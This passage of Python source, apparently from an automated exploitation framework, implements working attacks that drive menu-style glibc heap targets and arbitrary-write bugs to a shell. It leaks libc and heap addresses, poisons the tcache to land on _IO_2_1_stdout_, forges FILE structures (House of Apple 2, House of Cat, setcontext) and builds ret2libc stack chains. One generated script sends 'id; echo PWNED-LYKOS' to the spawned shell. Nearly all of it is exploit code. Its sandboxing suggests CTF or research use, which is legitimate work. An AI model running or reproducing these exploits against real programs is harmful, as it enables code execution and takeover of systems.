        "    fd2=struct.unpack('<Q',fo[off:off+8])[0] if len(fo)>=off+8 else 0\n"
        "    wide_addr=fd2 ^ heap   # two entries: head fd == (head>>12)^next, so next falls out\n"
        "    assert 0x550000000000<=wide_addr<0x600000000000, 'bad full heap addr %#x'%wide_addr\n"
        "    payload, wide = hoa2_split(stdout_addr, wide_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
        "    op(ADD(PB+2,POISON,b'E')); op(ADD(PB+3,POISON,wide[:POISON]))\n"
        "op(ADD(PB,POISON,b'C')); op(ADD(PB+1,POISON,b'D')); op(FREE(PB))\n"
        "heap=page_of(op(VIEW(PB),0.5))\n"
        "assert heap, 'heap leak failed'\n"
        "op(ADD(PB,POISON,b'C')); op(FREE(PB+1)); op(FREE(PB))\n"
        "op(EDIT(PB, struct.pack('<Q', heap ^ stdout_addr)+b'\\x00'*8)); op(ADD(PB+2,POISON,b'E'))\n"
        "if payload is None: payload=hoa2(stdout_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
        "op(ADD(PB+3,POISON,payload[:POISON]))\n"
        "p.stdin.write(EXIT); p.stdin.flush(); time.sleep(0.3)\n"
        "p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
        "out=read_until(p, time.time()+8, quiet=1.5)\n"
        "if b'PWNED-LYKOS' in out or b'uid=' in out:\n"
        "    print('shell (libc base %#x, heap %#x):'%(base,heap)); "
        "print(out.decode('latin-1','ignore')); sys.exit(0)\n"
        "sys.stderr.write('heap -> shell did not confirm\\n'); sys.exit(1)\n"
    ).encode()


# Leak size used when the fake FILE has to be split across two writes: it must differ from the
# poison size (whose tcache bin must stay empty) yet still exceed the fastbin ceiling, since a
# fastbin fd discloses a heap pointer rather than a main_arena bin head.
_SPLIT_LEAK_SIZE = 0x90


# --- automated glibc-heap -> shell: tcache poison _IO_2_1_stdout_ + House of Apple 2 (gap #4) ----
def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
                       poison_size=0x300, guard_size=0x430, fill_size=0x100, leak_mode="large",
                       fill_slots=None, marker=b"LYKOS-HEAP-9931",
                       timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
    """Drive a menu-style glibc-heap target to a shell, fully automatically, via tcache poisoning +
    House of Apple 2. Composes the pieces lykos already has (menu model, safe-linking, FSOP):

      1. libc leak  -- free a large chunk (skips tcache -> unsorted bin, its fd points into libc);
         view it; `base = leaked - unsorted_off` (main_arena+0x60 for the target's glibc). A
         SIZE-CAPPED notebook refuses that large request, so fall back to a tcache-FILL spill: free
         same-size chunks until one no longer fits the tcache bin and links into a main_arena bin
         head instead (the count is DISCOVERED, not assumed -- it is 7 on older glibc and 16 on 2.43).
      2. heap leak  -- free a tcache chunk and view its fd == chunk>>12 (safe-linking key; the low
         bits are not needed, mangle only XORs the page).
      3. poison     -- with two freed tcache chunks, edit the head's fd to mangle(chunk, stdout);
         two allocations then hand back a chunk AT `_IO_2_1_stdout_`.
      4. FSOP       -- write build_house_of_apple2 into that chunk, then `exit_seq` flushes the
         corrupted stdout -> system("/bin/sh").

    The four ops are supplied as callables that render the target's own menu input:
    `add(idx,size,data)->bytes`, `free(idx)->bytes`, `view(idx)->bytes`, `edit(idx,data)->bytes`;
    `exit_seq` triggers a flush. Confirmed by a spawned shell EVALUATING the forgery-proof
    `attribution` marker. Returns
    {ok, libc_base, heap_page, ...}."""
    import struct as _struct

    from . import attribution, rop
    from . import heap as _heap
    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
    markers = attribution.make_code_markers()
    T = _heap.house_of_apple2_targets(libc_data)
    if not T:
        return {"ok": False, "reason": "libc lacks _IO_2_1_stdout_/_IO_wfile_jumps/system"}
    exedir = str(Path(exe).resolve().parent)
    preexec = sandbox._rlimits(mem_mb, int(timeout) + 4, set_as=True)
    cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
        [str(exe)] + [str(a) for a in base_argv]
    try:
        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                             preexec_fn=preexec)
    except Exception as e:                               # noqa: BLE001
        return {"ok": False, "reason": f"spawn failed: {e!r}"}

    def _op(seq, read_secs=0.35):
        try:
            p.stdin.write(seq)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return b""
        return _read_until(p, time.time() + read_secs, quiet=0.2)

    def _bin_head_base(v):
        """libc base from a leaked bin-head pointer. A chunk that outgrows the tcache links into the
        UNSORTED bin head (main_arena+0x60 == unsorted_off), but once glibc sorts it, into its size's
        SMALL BIN head instead -- the bins live in one array at 0x10 strides, so the leak is
        `unsorted_off + 0x10*k` for an unknown k. Try each: because page alignment forces
        `cand == v (mod 0x1000)` and the candidates are distinct residues, AT MOST ONE k can match,
        so this cannot silently pick a second, wrong base. Requires a libc-range pointer first, so a
        heap/stack value is never mistaken for a bin head."""
        if not (0x7F0000000000 <= v < 0x800000000000):
            return None
        for k in range(128):
            b = rop.resolve_libc_base(v, unsorted_off + 0x10 * k)
            if b:
                return b
        return None

    def _windows(out):
        """(offset, value) for each 8-byte little-endian window of a view's output that could be a
        POINTER. A real menu may print a prompt ("idx: ", "Content: ") before the raw chunk bytes, so
        the pointer is not necessarily at offset 0. A window whose non-zero bytes are all printable
        ASCII is prompt text, never a pointer (a pointer carries a non-printable byte), so skip it."""
        for i in range(max(0, len(out) - 7)):
            win = out[i:i + 8]
            if all(b == 0 or 0x20 <= b <= 0x7e for b in win):
                continue
            yield i, _struct.unpack("<Q", win)[0]

    def _leak_libc_large():
        """A single large (above-tcache) chunk frees straight to a bin head. Two allocations so the
        freed one is not adjacent to the top chunk (which would consolidate instead of linking)."""
        _op(add(0, guard_size, b"A"))
        _op(add(1, guard_size, b"B"))
        _op(free(0))
        vout = _op(view(0), 0.5)
        for i, v in _windows(vout):
            b = _bin_head_base(v)
            if b:
                return b, i, 2
        return None, 0, 0

    def _leak_libc_fill(fill_size, max_slots=20):
        """Size-capped notebook: the large request above is refused, so FILL the tcache bin for a
        permitted size and keep freeing until one chunk no longer fits it and links into a main_arena
        bin head. The bin's capacity is DISCOVERED by viewing each freed chunk rather than assumed (7
        on older glibc, 16 on 2.43), so this needs no per-version constant. `fill_size` must be above
        the fastbin ceiling (a fastbin fd is a heap pointer, never libc); the caller picks it.

        Needs `capacity + 1` slots and no more. Two things keep it inside a SMALL notebook's table:

          * The slot count is discovered, not assumed: every allocation is VERIFIED by viewing its
            tag back, and the fill stops at the real end of the table. Finding that end COSTS the
            process -- the refused add leaves its data unread, which desyncs the menu and exits the
            target -- so the count is reported back and the caller replays the fill with
            `fill_slots` set, where nothing is ever allocated past the table.
          * The lowest slot is freed LAST, so the chunk that spills is never the one adjacent to the
            top chunk -- that one would consolidate into the top instead of linking into a bin. That
            removes the separate guard allocation an earlier version needed."""
        n = 0
        for i in range(fill_slots or max_slots):
            tag = b"S%04d" % i
            _op(add(i, fill_size, tag))
            if fill_slots is None and tag not in _op(view(i), 0.3):
                break                                    # end of the table (this process is now dead)
            n = i + 1
        if n < 3:                                    # too small to even hold the poison trio
            return None, 0, n
        for i in list(range(1, n)) + [0]:
            _op(free(i))
            vout = _op(view(i), 0.45)
            for off, v in _windows(vout):
                b = _bin_head_base(v)
                if b:
                    return b, off, n
        return None, 0, n

    def _leak_libc_dup(fill_size, max_dup=24):
        """Few-slot notebook: the fill above needs capacity+1 DISTINCT chunks held at once, which a
        small slot table cannot do. Re-enter the SAME chunk instead. tcache_put stamps a key into the
        chunk and _int_free only scans the bin for a duplicate when that key is still intact, so
        clearing it through the UAF write -- the very edit the poison already needs -- lets the chunk
        be freed into the bin again and again. Once the bin is full the next free links it into a
        main_arena bin head, exactly as the fill's spill does.

        Needs only TWO slots: the victim, and a guard so the victim never borders the top chunk
        (which would consolidate into it instead of linking)."""
        _op(add(0, fill_size, b"A"))
        _op(add(1, fill_size, b"G"))
        for _ in range(max_dup):
            _op(free(0))
            vout = _op(view(0), 0.45)
            for off, v in _windows(vout):
                b = _bin_head_base(v)
                if b:
                    return b, off, 2
            _op(edit(0, b"\x00" * 16))               # clear fd+key so the next free re-enters tcache
        return None, 0, 2

    try:
        _read_until(p, time.time() + 0.5)
        # 1) libc leak. The matching window's OFFSET is where this view's raw chunk bytes begin past
        #    any prompt (a prompt-straddling window cannot pass the page-alignment guard), which the
        #    heap leak below reuses as calibration.
        base, data_off, used = ({"fill": _leak_libc_fill, "dup": _leak_libc_dup}
                                .get(leak_mode, lambda _s: _leak_libc_large())(fill_size))
        if not base:
            why = {"fill": (f"tcache-fill at {fill_size:#x} over {used} usable slots disclosed no "
                            "bin head; the bin needs capacity+1 distinct chunks, so a smaller table "
                            "cannot spill"),
                   "dup": (f"re-entering one {fill_size:#x} chunk disclosed no bin head; the tcache "
                           "key-clear through edit did not take, so the bin never overflowed")
                   }.get(leak_mode, f"no bin head from a {guard_size:#x} chunk -- a size cap would "
                                    "refuse it")
            return {"ok": False, "slots": used, "reason": f"libc leak failed ({why})"}
        # Poison slots. The large path allocated indices 0-1, so start past them. The fill and dup
        # paths leave low slots holding FREED chunks whose slot entries are free to overwrite: the
        # poison runs in a DIFFERENT size class, so its own tcache bin is still empty (what step 2
        # needs), and reusing those slots keeps the whole chain inside a small table.
        pb = 2 if leak_mode == "large" else 0
        stdout_addr = base + T["stdout"]
        # 2) heap leak via a freed tcache chunk's safe-linked fd == chunk2>>12. The fd sits at the
        #    SAME offset in this view's output as the libc fd did (same view op, same prompts), so read
        #    it there rather than guessing where a prompt ends -- a non-PIE heap page is tiny (~0x405)
        #    and indistinguishable by value from a misaligned prompt-straddling window. Fall back to a
        #    scan only when the calibrated word is implausible (prompt timing shifted the output).
        def _page_of(out):
            """chunk>>12 from a LONE tcache entry's fd. Prefer the offset the libc leak calibrated
            (same view op, same prompts); a non-PIE heap page is tiny and otherwise indistinguishable
            from a misaligned prompt-straddling window."""
            if len(out) >= data_off + 8:
                c = _struct.unpack("<Q", out[data_off:data_off + 8])[0]
                if 0 < c < (1 << 40):
                    return c
            return next((v for _, v in _windows(out) if 0 < v < (1 << 40)), 0)

        split = poison_size < _heap.HOA2_BLOB_MIN
        wide_addr = 0
        if split:
            # The cap cannot hold the one-piece fake FILE, so the fake _IO_wide_data and its jump
            # table go in a chunk of OUR own -- which means we need that chunk's FULL address, not
            # just its page. Two entries in a bin give it up: the head's fd is
            # (head>>12) ^ next, and head>>12 is what a LONE entry disclosed, so next falls out.
            _op(add(pb, poison_size, b"C"))
            _op(add(pb + 1, poison_size, b"D"))
            _op(free(pb))
            heap_page = _page_of(_op(view(pb), 0.5))
            if not heap_page:
                return {"ok": False, "reason": "heap leak failed (split)", "libc_base": base}
            _op(free(pb + 1))
            fout = _op(view(pb + 1), 0.5)
            fd2 = (_struct.unpack("<Q", fout[data_off:data_off + 8])[0]
                   if len(fout) >= data_off + 8 else 0)
            wide_addr = fd2 ^ heap_page                  # the full address of the first-freed chunk
            if not (0x550000000000 <= wide_addr < 0x600000000000):
                return {"ok": False, "libc_base": base,
                        "reason": f"full heap address implausible ({wide_addr:#x})"}
            hdr, wide = _heap.build_house_of_apple2_split(
                stdout_addr, wide_addr, wfile_jumps=base + T["wfile_jumps"],
                system=base + T["system"])
            # The bin holds [second-freed -> first-freed], so the SECOND allocation lands on
            # wide_addr; park the fake structures there and leave the bin empty again.
            _op(add(pb + 2, poison_size, b"E"))
            _op(add(pb + 3, poison_size, wide[:poison_size]))
            payload = hdr
        else:
            payload = None                               # built below, once heap_page is known

        # 2) heap leak + 3) poison: with two freed tcache chunks, mangle the head's fd so the second
        #    allocation after it is handed back AT _IO_2_1_stdout_.
        _op(add(pb, poison_size, b"C"))
        _op(add(pb + 1, poison_size, b"D"))
        _op(free(pb))
        hout = _op(view(pb), 0.5)
        heap_page = _page_of(hout)
        if not heap_page:
            # Report the recovered base even though this failed: it is what tells the caller the
            # LEAK stage worked and only the poison did not, which is the cue to retry with a
            # cap-sized poison chunk (and hence the split fake FILE).
            return {"ok": False, "libc_base": base,
                    "reason": f"heap leak failed (dump {hout[:32].hex()})"}
        _op(add(pb, poison_size, b"C"))              # take the chunk back; tcache empty for this size
        _op(free(pb + 1))
        _op(free(pb))
        _op(edit(pb, _struct.pack("<Q", heap_page ^ stdout_addr) + b"\x00" * 8))
        _op(add(pb + 2, poison_size, b"E"))          # returns the poisoned chunk
        # 4) the next allocation lands on _IO_2_1_stdout_; write the fake FILE there
        if payload is None:
            payload = _heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
                                                  system=base + T["system"])
        _op(add(pb + 3, poison_size, payload[:poison_size]))
        # trigger the flush -> FSOP -> shell, then confirm
        try:
            p.stdin.write(exit_seq)
            p.stdin.flush()
            time.sleep(0.3)
            # Lead with a newline: a FIXED-WIDTH exit_seq is padded to exactly W bytes and carries NO
            # newline (that is what the target's read(fd,buf,W) expects), so without this the spawned
            # shell's first line is "5<pad>echo <marker>" -- the marker becomes an argument to a bogus
            # command and never echoes, failing the confirmation on an exploit that actually worked.
            p.stdin.write(b"\n" + markers.command + b"\n")
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return {"ok": False, "reason": "crashed before the shell", "libc_base": base}
        out = _read_until(p, time.time() + timeout, quiet=1.5)
        if markers.proves(out):
            return {"ok": True, "libc_base": base, "heap_page": heap_page, "slots": used,
                    "stdout": stdout_addr, "poison_size": poison_size,
                    "wide_addr": wide_addr or None,
                    "fill_size": None if leak_mode == "large" else fill_size,
                    "strategy": {"fill": "tcache-fill", "dup": "tcache-dup"}.get(leak_mode,
                                                                                 "large-chunk"),
                    "output": out[:400].decode("latin-1", "ignore")}
        return {"ok": False, "reason": "no shell confirmed", "libc_base": base,
                "output": out[:200].decode("latin-1", "ignore")}
    finally:
        for s in (p.stdin, p.stdout):
            try:
                if s is not None:
                    s.close()
            except Exception:                           # noqa: BLE001
                pass
        _kill(p)
        try:
            p.wait(timeout=2)
        except Exception:                               # noqa: BLE001
            pass


def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
                      poison_size=0x300, guard_size=0x430, fill_size=0x100,
                      marker=b"LYKOS-HEAP-9931", timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
    """Drive a menu-style glibc-heap target to a shell (tcache poison of _IO_2_1_stdout_ + House of
    Apple 2), trying both libc-leak strategies:

      large-chunk -- free one above-tcache chunk; it links into a bin head straight away. Fast, and
                     what an uncapped notebook allows.
      tcache-fill -- for a SIZE-CAPPED notebook, which refuses that large request: fill the tcache
                     bin for a permitted size until a chunk spills into a bin head instead.

    The retry runs on a FRESH process: the refused allocation leaves its data bytes unread, which
    desyncs the menu (the stray byte is read as the next option) and usually exits the target, so the
    second strategy cannot share the first one's process. Returns {ok, libc_base, heap_page,
    strategy, fill_size, ...}; `strategy`/`fill_size` tell the caller what to put in the reproducer."""
    from . import heap as _heap  # this wrapper is NOT inside _heap_fsop_attempt
    kw = dict(add=add, free=free, view=view, edit=edit, exit_seq=exit_seq, libc_data=libc_data,
              unsorted_off=unsorted_off, poison_size=poison_size, guard_size=guard_size,
              fill_size=fill_size, marker=marker, timeout=timeout, base_argv=base_argv,
              mem_mb=mem_mb)

    def _try(mode, **over):
        """One attempt, plus a SPLIT-payload retry when the leak worked but the FSOP stage did not.
        That pattern means the size cap refused the one-piece fake FILE (which needs 0x2A8 bytes),
        so retry at a size the notebook has already proven it accepts -- the leak's own fill_size --
        which puts the fake _IO_wide_data in our own chunk instead of inside the stdout write."""
        r = _heap_fsop_attempt(exe, workdir, leak_mode=mode, **{**kw, **over})
        tried = int(over.get("poison_size", kw["poison_size"]))
        # The SMALLEST chunk that still holds both split writes (the 0xE0 FILE header and the 0xE8
        # wide blob). Going smaller than the cap allows costs nothing and covers every cap down to
        # this floor; picking something larger just to match the leak size would refuse a tight cap.
        small = _heap.HOA2_SPLIT_MIN
        if (not r.get("ok") and r.get("libc_base")
                and tried >= _heap.HOA2_BLOB_MIN > small):
            # Leak at a SMALLER size than the poison. A fill or dup leaves its own size's tcache bin
            # full (dup leaves it full of one repeated chunk), and the poison needs a bin it can put
            # exactly one chunk into -- so the two must not share a size class. 0x90 keeps the leak
            # chunk above the fastbin ceiling, which a bin-head leak requires.
            r2 = _heap_fsop_attempt(exe, workdir, leak_mode=mode,
                                    **{**kw, **over, "poison_size": small,
                                       "fill_size": _SPLIT_LEAK_SIZE})
            if r2.get("ok"):
                return r2
        return r

    res = _try("large")
    if res.get("ok") or "libc leak failed" not in str(res.get("reason", "")):
        return res
    res2 = _try("fill")
    # Probing for the end of a SMALL slot table costs that process (the refused add desyncs the menu
    # and exits the target), so if the fill discovered a table shorter than it probed, replay it with
    # the count now known -- that run allocates only real slots and keeps its process alive. Below 8
    # slots no glibc's tcache can be filled by distinct chunks at all, so don't spend a replay on it.
    slots = res2.get("slots") or 0
    if not res2.get("ok") and 8 <= slots < 20:
        res2 = _try("fill", fill_slots=slots)
    if res2.get("ok"):
        return res2
    # Still nothing: the table is too small to hold capacity+1 distinct chunks. Re-enter ONE chunk
    # instead, which needs only a victim and a guard.
    res3 = _try("dup")
    if res3.get("ok"):
        return res3
    # A TIGHT cap refuses even the default leak chunk, so the leak itself never gets far enough to
    # ask for a smaller poison. Retry the re-entry leak at a size any cap above the fastbin ceiling
    # accepts; its own split retry then sizes the poison down too.
    if int(kw["fill_size"]) != _SPLIT_LEAK_SIZE:
        res4 = _try("dup", fill_size=_SPLIT_LEAK_SIZE)
        if res4.get("ok"):
            return res4
        res3 = res4
    res3["reason"] = (f"{res.get('reason')}; then {res2.get('reason')}; then {res3.get('reason')}")
    return res3


# ----------------------------------------------- write-what-where -> shell (no win, no leak given)
#: What an `arr[i] = v` style write primitive can disclose and then forge. The two sides of the
#: same bug: the unchecked index reads a GOT slot (a libc address, once that function has been
#: called) and writes House-of-Apple-2 cells over a FILE, so a target with NO win function, no
#: `system` in its PLT and ASLR on still reaches a shell. Everything is in-band and in ONE process.
_WWW_MARKER = b"LYKOS-WWW-7731"


def _int_candidates(out: bytes) -> list:
    """Every 64-bit value a read of one memory word could have printed, as unsigned: a decimal
    (`printf("%ld")`, the dominant shape -- negative because the word's top bit is set; a single
    digit counts, since a word that reads back as 0 is one of the things we check for), a hex
    literal (`%p`/`%lx`), and each raw little-endian 8-byte window (a target that writes the word
    out as bytes). Order matters only in that each is TESTED against a predicate (does it resolve a
    page-aligned libc base; is it the value we just wrote), so a wrong candidate is rejected, never
    guessed at."""
    vals = []
    for m in re.finditer(rb"-?\d+", out):               # single digits too: a word that reads 0
        vals.append(int(m.group(0)) & 0xFFFFFFFFFFFFFFFF)
    for m in re.finditer(rb"0x([0-9a-fA-F]{2,16})", out):
        vals.append(int(m.group(1), 16))
    for i in range(max(0, len(out) - 7)):
        win = out[i:i + 8]
        if all(b == 0 or 0x20 <= b <= 0x7E for b in win):
            continue                                     # printable -> prompt text, not a word
        vals.append(struct.unpack("<Q", win)[0])
    return vals


def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_slots,
                       scratch: int, scratch_size: int = 0, exit_seqs=(b"q\n",),
                       marker: bytes = _WWW_MARKER,
                       plans=("setcontext", "system", "cat", "stack"),
                       timeout: float = 14.0, base_argv=(), mem_mb: int = 2048,
                       target_bytes: bytes = b"", target_base: int = 0) -> dict:
    """Turn a one-word-at-a-time ARBITRARY WRITE (plus the arbitrary READ that usually comes with
    it) into a spawned shell, with no win function and no `system` in the target's PLT.

      1. libc leak  -- read a GOT slot whose libc function has already been called; the resolved
         address minus that symbol's offset in the libc the target actually links is the base, and
         `rop.resolve_libc_base` accepts it only if the result is page aligned.
      2. the FILE    -- read the forged FILE's own `_wide_data` out of the target rather than
         guessing it, and check the wide `_IO_buf_base` it points at is NULL (the condition
         `_IO_wdoallocbuf` tests). Both are leaks the same primitive already gives us.
      3. the cells   -- written in order and each READ BACK, so a cell that did not land is a
         stated failure rather than a crash at the trigger.
      4. the trigger -- each of `exit_seqs` in turn makes the program return from main, so exit()
         walks `_IO_list_all` and the forged FILE's overflow runs. Several are tried on the SAME
         live process: the cells are already in place, so a sequence that does not exit costs one
         prompt rather than a whole run.

    `plans` are the FSOP payloads to try, in order, each in its OWN process -- a plan that gets
    part way leaves a half-forged FILE behind, so they cannot share one:

      "setcontext" -- `heap.setcontext_fsop_cells`: the fake `__doallocate` is `setcontext`'s
                      register-loading entry, which works because `_IO_wdoallocbuf` does
                      `mov rdx,rdi` first, so the forged FILE is its own ucontext. Full register
                      control, used here for `execve("/bin/sh", NULL, NULL)`.
      "system"     -- `heap.house_of_apple2_cells`: the fake `__doallocate` is `system` and the
                      FILE's `_flags` doubles as the command string.
      "cat"        -- `heap.build_house_of_cat`: do not forge a FILE glibc owns at all. Write the
                      whole FILE, its `_IO_wide_data` and its fake `_wide_vtable` into `scratch`,
                      then write ONE pointer, `_IO_list_all := scratch`. Needs
                      `scratch_size >= heap.CAT_BLOB_MIN`, and takes the setcontext finish when
                      the libc has one.

      "stack"      -- LAST, and no FILE at all: read libc's `environ` for a stack address, walk
                      down it for MAIN's saved return address (`rop.saved_return_slots` with
                      `rop.main_return_images`), and write a `system("/bin/sh")` chain over it.
                      The only plan that needs nothing of the libc but `environ`, `system` and a
                      `pop rdi`, so it is what is left when the FILE structs are unreachable --
                      a program that has closed the stream the other plans forge, or an array too
                      small to hold a FILE of our own. Needs `target_bytes` to tell a saved return
                      address from a code pointer in a local, and is tried at BOTH rsp parities
                      because `system`'s prologue has a `movaps`: measured, one parity segfaults
                      and the other spawns a shell.

    setcontext goes first because `execve` beats `system(" /bin/sh")` on both counts that matter
    here: it needs none of the ~2 KB of stack `system` wants under the pivoted rsp (which lands in
    libc's `.data`), and it does not need the command to survive in a field that is also a
    bitfield. `cat` goes last despite being the fewest writes and needing the FEWEST leaks (no
    `_wide_data` read-back, no `_flags` read): the blob lands in the target's own array, which is
    the object the bug indexes, so it is the plan that disturbs the running program most.

    `write_cell(addr, value) -> bytes` and `read_cell(addr) -> bytes` render the target's own input
    for one write / one read; `leak_slots` is [(got_address, libc_symbol_name)] in try order;
    `scratch` is a writable address whose +0x68 may be used for the fake wide jump table (the
    target's own global array). Confirmed by a shell EVALUATING the forgery-proof `attribution`
    marker. Returns
    {ok, plan, plans_tried, libc_base, fp, cells, reason}."""
    from . import attribution, rop
    from . import heap as _heap
    # Forgery-proof confirm: the marker command only resolves if a shell EVALUATES it (an echo of
    # the input, a menu that reflects it, or a banner can never satisfy `markers.proves`).
    markers = attribution.make_code_markers()
    syms = rop.libc_symbols(libc_data, tuple({n for _a, n in leak_slots}))
    usable = [(a, n) for a, n in leak_slots if n in syms]
    if not usable:
        return {"ok": False, "reason": "no GOT slot names a symbol the linked libc exports"}
    cat_finish = "setcontext" if _heap.house_of_cat_targets(libc_data, "setcontext") else "system"
    targets = {"setcontext": _heap.setcontext_fsop_targets(libc_data),
               "stack": rop.environ_stack_targets(libc_data),
               "system": _heap.house_of_apple2_cell_targets(libc_data),
               "cat": _heap.house_of_cat_targets(libc_data, cat_finish)}
    if int(scratch_size or 0) < _heap.CAT_BLOB_MIN:
        targets["cat"] = {}                            # no room for the blob beside the bug
    if not target_bytes or not rop.exec_range(target_bytes):
        targets["stack"] = {}                          # no image to test a return site against
    runnable = [k for k in plans if targets.get(k)]
    if not runnable:
        return {"ok": False, "reason": "the linked libc supports no FSOP plan "
                                       f"(wanted {list(plans)}; it lacks the symbols)"}

    exedir = str(Path(exe).resolve().parent)
    cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
        [str(exe)] + [str(a) for a in base_argv]

    def _attempt(plan: str, align: bool = False) -> dict:
        T = targets[plan]
        if plan == "setcontext" and T.get("rip_at") is None:
            # setcontext's push-continuation (the pushed-RIP offset) was not located in this libc,
            # so the register-load finisher cannot place execve. Report it and let the plan loop
            # fall through to the system / cat routes rather than crashing on a None offset.
            return {"ok": False, "reason": "setcontext's pushed-RIP offset was not found in this "
                    "libc (its register-load tail differs here), so the setcontext finisher is "
                    "unavailable -- the system/cat route is used instead"}
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=sandbox._rlimits(mem_mb, int(timeout) + 6,
                                                             set_as=True))
        except Exception as e:                           # noqa: BLE001
            return {"ok": False, "reason": f"spawn failed: {e!r}"}

        def _op(seq, read_secs=0.3):
            try:
                p.stdin.write(seq)
                p.stdin.flush()
            except (BrokenPipeError, OSError):
                return b""
            return _read_until(p, time.time() + read_secs, quiet=0.2)

        def _read(addr, secs=0.3):
            return _int_candidates(_op(read_cell(addr), secs))

        try:
            _op(b"", 0.3)                                # the first prompt
            base = None
            for addr, name in usable:
                for v in _read(addr):
                    base = rop.resolve_libc_base(v, syms[name])
                    if base:
                        break
                if base:
                    break
            if not base:
                return {"ok": False, "reason": "no GOT read resolved a page-aligned libc base "
                                               "(the slot may still be unresolved / lazily bound)"}
            if plan == "stack":
                stack = next((v for v in _read(base + T["environ"])
                              if 0x7F0000000000 < v < 0x800000000000), None)
                if stack is None:
                    return {"ok": False, "libc_base": base,
                            "reason": f"read of {T['environ_name']} ({base + T['environ']:#x}) "
                                      "disclosed no stack-range pointer"}
                images, skip = rop.main_return_images(target_bytes, libc_data, base,
                                                      target_base=target_base)
                slots = rop.saved_return_slots(lambda a: _read(a, 0.15), stack, images=images,
                                               skip=skip, limit=6)
                slot = next((a for a, _v, lbl in slots if lbl == "libc"), None)
                if slot is None:
                    return {"ok": False, "libc_base": base, "stack": hex(stack),
                            "slots": [(hex(a), hex(v), lb) for a, v, lb in slots],
                            "reason": "no saved return address into libc below environ, so "
                                      "main's frame was not found (the read primitive may not "
                                      "reach the stack)"}
                chain = rop.build_stack_ret2libc(
                    pop_rdi=base + T["pop_rdi"], binsh=base + T["binsh"],
                    system=base + T["system"], ret_gadget=(base + T["ret"]) if align else 0)
                cells = [(slot + 8 * k, w) for k, w in enumerate(chain)]
                shown = [(hex(a), hex(v)) for a, v in cells]
                for addr, val in cells:
                    _op(write_cell(addr, val))
                    if val not in _read(addr):
                        return {"ok": False, "libc_base": base, "cells": shown,
                                "reason": f"cell {addr:#x} := {val:#x} did not read back; the "
                                          "write primitive does not reach the stack"}
                for seq in (tuple(exit_seqs) or (b"",)):
                    out = _op(seq, 0.6) if seq else b""
                    out += _op(markers.command + b"\n", 1.2)
                    if markers.proves(out):
                        return {"ok": True, "libc_base": base, "fp": slot, "cells": shown,
                                "fp_name": "main's saved return address",
                                "exit_seq": seq, "finish": "system", "align": align,
                                "stack": hex(stack), "slot": hex(slot),
                                "targets": dict({k: v for k, v in T.items()
                                                 if k != "environ_name"}, align=align)}
                    if p.poll() is not None:
                        break
                return {"ok": False, "libc_base": base, "cells": shown, "align": align,
                        "reason": f"the chain landed over main's saved return ({slot:#x}) but no "
                                  f"trigger spawned a shell (exit {p.poll()!r}); "
                                  f"rsp parity align={align}"}
            if plan == "cat":
                kw = {"wfile_jumps": base + T["wfile_jumps"], "plan": T["plan"],
                      "size": _heap.CAT_BLOB_MIN}
                if T["plan"] == "setcontext":
                    kw.update(setcontext=base + T["setcontext"], fields=T["fields"],
                              rip_at=T["rip_at"], rip=base + T["execve"],
                              rdi=base + T["binsh"], rsi=0, rdx=0)
                else:
                    kw["system"] = base + T["system"]
                blob = _heap.build_house_of_cat(scratch, **kw)
                # Only the non-zero words: the array the bug indexes starts zeroed, and every
                # write is a round trip through the target's own prompts.
                cells = [(scratch + o, struct.unpack("<Q", blob[o:o + 8])[0])
                         for o in range(0, len(blob), 8)
                         if struct.unpack("<Q", blob[o:o + 8])[0]]
                cells.append((base + T["list_all"], scratch))
                shown = [(hex(a), hex(v)) for a, v in cells]
                for addr, val in cells:
                    _op(write_cell(addr, val))
                    if val not in _read(addr):
                        return {"ok": False, "libc_base": base, "cells": shown,
                                "reason": f"cell {addr:#x} := {val:#x} did not read back; the "
                                          "write primitive does not reach that address"}
                for seq in (tuple(exit_seqs) or (b"",)):
                    out = _op(seq, 0.6) if seq else b""
                    out += _op(markers.command + b"\n", 1.2)
                    if markers.proves(out):
                        return {"ok": True, "libc_base": base, "fp": scratch, "cells": shown,
                                "fp_name": "a FILE of our own in the target's array",
                                "exit_seq": seq, "finish": T["plan"],
                                "targets": {k: v for k, v in T.items() if k != "fp_name"}}
                    if p.poll() is not None:
                        break
                return {"ok": False, "libc_base": base, "cells": shown,
                        "reason": f"_IO_list_all := {scratch:#x} and the blob landed, but no "
                                  f"trigger spawned a shell (exit {p.poll()!r})"}
            fp = base + T["fp"]
            wide = next((v for v in _read(fp + T["wide_data_field"])
                         if base <= v < base + 0x600000), None)
            if wide is None:
                return {"ok": False, "libc_base": base,
                        "reason": f"read of {T['fp_name']}+{T['wide_data_field']:#x} disclosed no "
                                  "libc-range _wide_data pointer"}
            if 0 not in _read(wide + T["wide_buf_base_field"]):
                return {"ok": False, "libc_base": base,
                        "reason": "the forged FILE's wide _IO_buf_base is not NULL, so "
                                  "_IO_wdoallocbuf would not take the allocate path"}
            if plan == "setcontext":
                flags = next((v for v in _read(fp + T["flags_field"]) if v >> 16 == 0xFBAD), None)
                if flags is None:
                    return {"ok": False, "libc_base": base,
                            "reason": f"read of {T['fp_name']}+0 disclosed no _IO_MAGIC _flags "
                                      "word, so the bits to turn are not known"}
                cells = _heap.setcontext_fsop_cells(
